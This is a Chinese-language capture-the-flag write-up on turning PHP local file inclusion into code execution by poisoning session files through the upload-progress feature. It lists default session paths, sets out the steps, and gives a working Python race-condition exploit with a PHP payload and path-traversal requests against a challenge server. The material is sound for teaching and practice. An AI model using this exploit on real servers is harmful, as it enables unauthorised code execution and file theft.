
> 在最近的一次ctf比赛中发现了一道题目，同时满足了phpinfo与LFI的条件，在之前一直以为是利用上传文件的缓存文件进行条件竞争，也修改了许多次脚本但并没有成功，在翻文档后才知道php session本地文件包含这个知识点，特此写下学到的知识点

# 一、What is PHP Session

在访问网站时会生成一个唯一的PHP SESSIONID，一般会储存在Cookie或者URL中的SESSIONID变量中

PHP中的 **session.save_path** 配置指定了session文件的结构深度、文件权限、存放路径，格式为 **N;MODE;/path** N表示子文件夹划分深度，MODE表示文件的umask值（默认为600），path通常为以下几个
**/var/lib/php/sessions**
**/var/lib/php/sess_PHPSESSID
/var/lib/php/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID**

PHP在大文件流式上传时，为了将上传进度存放在session中，如果不存在session则会自动初始化，直到文件上传结束后销毁（由 **session.upload_progress.cleanup** 指定）。当 **session.upload_progress.enabled** 为默认值1时，上传文件的同时传递**name="PHP_SESSION_UPLOAD_PROGRESS** "即可利用（由 **session.upload_progress.name** 指定）

session.name通常为 **PHPSESSID** ，用作Cookie的键名。当 **session.use_strict_mode** 为默认值0时，客户端可以自定义session
即：通过Cookie传递PHPSESSID=n0b1ta后，服务器将创建对应的sess_n0b1ta文件。

[PHP Session Introduction](https://www.php.net/manual/en/intro.session.php)

# 二、利用条件

1. SESSION文件路径已知
2. 站点存在LFI漏洞

对于SESSION路径，有下列几种获取方式，可能不全，望及时补充👇

1. 默认路径，即:
   **/var/lib/php/sessions**
   **/var/lib/php/sess_PHPSESSID
   /var/lib/php/sess_PHPSESSID
   /tmp/sess_PHPSESSID
   /tmp/sessions/sess_PHPSESSID**
2. PHPINFO中的 **session.save_path**
3. 使用LFI漏洞读取php.ini中的 **session.save_path** 配置

# 三、利用思路

1. 搜寻存在LFI的页面，一般情况下有切换语言的传参等常出现此类漏洞的点
2. 寻找session文件路径，详见利用条件中的SESSION获取方式
3. 使用LFI读取SESSION文件，查看其内容判定哪些内容可以被我们控制修改
4. 若有参数可以携带我们可控的内容，将payload写进可操控参数中，包含文件即可，若无参数可携带我们可控的内容，构造文件上传内容，进行条件竞争读取，也就是下面所说的(上面也说过)👇

>PHP在大文件流式上传时，为了将上传进度存放在session中，如果不存在session则会自动初始化，直到文件上传结束后销毁（由 session.upload_progress.cleanup 指定）。当 session.upload_progress.enabled 为默认值1时，上传文件的同时传递name="PHP_SESSION_UPLOAD_PROGRESS "即可利用（由 session.upload_progress.name 指定）

# 四、Payload and EXP

CISCN 线上初赛 middle_source
该赛题无可控参数，可构造上传点，拥有phpinfo脚本，可以查看到path

```python
import io
import requests
import threading
sessid = 'S3BABFKDMFSAFLL' #指定SSID值，用于读取文件
data = {"cmd":"system('cat flag.php');"}  
def write(session):
 while True:
  f = io.BytesIO(b'a' * 1024 * 50)
  resp = session.post('http://124.70.45.83:23753/',
   data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php scandir(readfile("/etc/chbdfhfefb/fbgfaeecad/cahcbiidcb/aejfhfffba/ecdiehbhab/fl444444g"));?>'},
   files={'file': ('test.txt',f)},
    cookies={'PHPSESSID': sessid} ) #通过scandir('/etc')逐层寻找flag所在位置，嗯套
    
def read(session):
 while True:
  data={
  'filed':'',
  'cf':'../../../../../../var/lib/php/sessions/cfaefhcedg/sess_'+sessid
  }
  resp = session.post('http://124.70.45.83:23753/',data=data)
  if 'test.txt' in resp.text:
   print(resp.text)
   event.clear()
  else:
   print("[+++++++++++++]retry")
if __name__=="__main__":
 event=threading.Event()
 with requests.session() as session:
  for i in range(1,10): 
   threading.Thread(target=write,args=(session,)).start()
  for i in range(1,10):
   threading.Thread(target=read,args=(session,)).start()
 event.set()
```

# 五、实战案例

[From-lfi-to-rce-via-php-sessions](https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/)

[一道CTF题：PHP文件包含](https://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/)

